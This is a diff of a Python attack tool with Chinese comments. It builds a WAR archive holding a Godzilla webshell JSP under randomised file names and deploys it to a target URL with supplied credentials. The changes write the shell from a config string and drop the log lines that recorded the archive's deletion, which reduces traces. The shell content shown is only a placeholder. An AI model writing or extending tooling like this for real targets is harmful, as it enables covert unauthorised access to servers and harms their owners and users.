@@ -42,18 +42,24 @@ def generate_random_string(length=6):
 
 # 生成 WAR 文件，其中包含 Godzilla Webshell
 def generate_war(config):
-    shell_file_path = config['files']['shell_file']
+    shell_content = config['files'].get('shell_file_content', '<%-- 默认的 shell.jsp 内容 --%>')
     random_string = generate_random_string()
     war_file_name = f"{random_string}.war"
     shell_file_name = f"{generate_random_string()}.jsp"
 
-    if not os.path.isfile(shell_file_path):
-        logger.error(f"文件 {shell_file_path} 不存在")
-        return None, None, None
-
     try:
+        # 创建临时 JSP 文件
+        temp_jsp_path = shell_file_name
+        with open(temp_jsp_path, 'w', encoding='utf-8') as jsp_file:
+            jsp_file.write(shell_content)
+
+        # 生成 WAR 包
         with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
-            war.write(shell_file_path, shell_file_name)
+            war.write(temp_jsp_path, shell_file_name)
+
+        # 删除临时 JSP 文件
+        os.remove(temp_jsp_path)
+
         logger.info(f"[+] WAR 包生成成功: {war_file_name}，JSP 文件名: {shell_file_name}")
         return war_file_name, random_string, shell_file_name
     except Exception as e:
@@ -99,7 +105,6 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
         if os.path.isfile(war_file_path):
             try:
                 os.remove(war_file_path)
-                logger.info(f"[+] 删除 WAR 文件: {war_file_path}")
             except OSError as e:
                 logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
         return
@@ -139,7 +144,6 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
     if os.path.isfile(war_file_path):
         try:
             os.remove(war_file_path)
-            logger.info(f"[+] 已删除 WAR 文件: {war_file_path}")
         except OSError as e:
             logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
 
